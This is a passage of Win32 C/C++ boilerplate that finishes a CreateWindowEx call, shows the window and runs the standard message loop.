        CW_USEDEFAULT, CW_USEDEFAULT, 500, 400,
        
        NULL,       // Parent window    
        NULL,       // Menu
        hInstance,  // Instance handle
        NULL        // Additional application data
    );
    
    if (hwnd == NULL) {
        return 0;
    }
    
    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);
    
    // Message loop
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}